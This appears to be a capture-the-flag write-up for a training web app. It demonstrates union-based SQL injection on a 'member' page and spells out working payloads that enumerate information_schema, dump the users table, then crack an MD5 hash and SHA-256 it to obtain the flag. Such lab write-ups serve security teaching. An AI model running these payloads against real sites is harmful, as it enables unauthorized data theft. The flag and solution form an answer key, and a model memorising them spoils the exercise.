# UNION BASED SQL INJECTION

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery
go to
```
 http://{IP_ADDRESS}/index.php?page=member
```

tryed a simple sql statement 
```
1 OR 1=1 
The SQL above is valid and will return ALL rows from the "users" table, since OR 1=1 is always TRUE.
```

Retrieve columns names with the table they belong to:
```
1 UNION SELECT table_name,column_name FROM information_schema.COLUMNS 
```
> user_id, first_name, last_name, town, country, planet, commentaire, countersign

the command below will retrieve all image's data
```
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, commentaire, countersign) FROM users
```

the result shows this interesting user with name (flag):

The table below show the result 

| user_id | first_name | last_name | town | country | planet | commentaire                                                                       | countersign 						|
| ------- | ---------- | --------- | ---- | ------- | ------ | --------------------------------------------------------------------------------- | ----------- 						|
|   5     | flag       | GetThe    |  42  |    42   |   42   | Decrypt this password -> then lower all the char. Sh256 on it and it's go    od ! | 5ff9d0165b4f92b14994e5c685cdce28 |

following the instruction :
* analyzing the password using [cipher identifier](https://www.dcode.fr/cipher-identifier)
* decrypt the password using [md5decrypt - md5](https://md5decrypt.net/en/)
* 5ff9d0165b4f92b14994e5c685cdce28 gives FortyTwo 
* lower all the char, encrypt it using Sh256
* flag is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Helpers:
- [retrieve data from db](https://www.sqlinjection.net/table-names/)
- [dcode - cipher identifier](https://www.dcode.fr/cipher-identifier)
- [md5decrypt - md5](https://md5decrypt.net/en/)
